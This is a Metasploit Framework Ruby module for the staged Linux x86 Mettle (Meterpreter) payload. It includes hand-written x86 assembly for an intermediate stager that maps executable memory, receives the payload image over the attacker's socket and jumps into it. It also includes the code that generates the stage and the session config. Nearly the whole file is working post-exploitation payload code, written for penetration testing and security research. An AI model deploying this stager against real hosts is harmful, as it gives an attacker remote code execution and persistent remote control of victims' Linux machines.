##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/meterpreter_x86_linux'
require 'msf/base/sessions/meterpreter_options'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Mettle x86',
      'Description'   => 'Inject the mettle server payload (staged)',
      'Author'        => [
        'William Webb'
      ],
      'Platform'      => 'Linux',
      'Arch'          => ARCH_X86,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Linux)) # ? will we need to add a new one for x64?
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
    ep = elf.elf_header.e_entry
    return ep
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)

    # does metasm understand comments ?

    midstager_asm = %Q^
      xor ebx, ebx                ; address
      mov ecx, #{payload.length}  ; length
      mov edx, 7                  ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov esi, 34                 ; MAP_PRIVATE | MAP_ANONYMOUS
      xor edi, edi                ; fd
      xor ebp, ebp                ; pgoffset
      mov eax, 192                ; mmap2
      int 0x80                    ; syscall

      ; recv mettle process image
      mov edx, ecx                ; ecx should still contain SIZE
      pop ebx                     ; should still be SOCKFD
      mov edi, ebx                ; copy sockfd to edi for later on
      mov ecx, eax                ; mmap'ed buffer address
      mov esi, 256                ; MSG_WAITALL
      mov eax, 291                ; recv
      int 0x80                    ; syscall

      xor ebx, ebx
      and esp, 0xfffffff0         ; align esp
      add esp, 260                ; add esp, see adam or a debugger for explaination
      push ebx                    ; NULL
      push ebx                    ; AT_NULL
      push ecx                    ; mmap'ed buffer ? is ecx still preserved at this point?
      mov eax, 7
      push eax                    ; AT_BASE
      push ebx                    ; end of ENV
      push ebx                    ; NULL
      push edi                    ; sockfd
      push esp                    ; argv[0]
      mov eax, 2
      push eax                    ; argc
      mov eax, 109
      push eax                    ; "m" (0,0,0,109)

      ; down the rabbit hole
      mov eax, #{entry_offset}
      mov ebx, #{payload.length}
      add eax, ebx
      jmp eax
    ^

    midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string
    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
    conn.put([midstager.length].pack('V'))
    conn.put(midstager)

    true
  end

  def generate_stage(opts={})
    meterpreter = generate_meterpreter
  end

  def generate_meterpreter
    MetasploitPayloads.read('meterpreter', 'mettle-linux-x86.bin')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      :arch       => opts[:uuid].arch,
      :exitfunk   => nil,
      :expiration => datastore['SessionExpirationTimeout'].to_i,
      :uuid       => opts[:uuid],
      :transports => [transport_config(opts)],
      :extensions => [],
      :ascii_str  => true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

end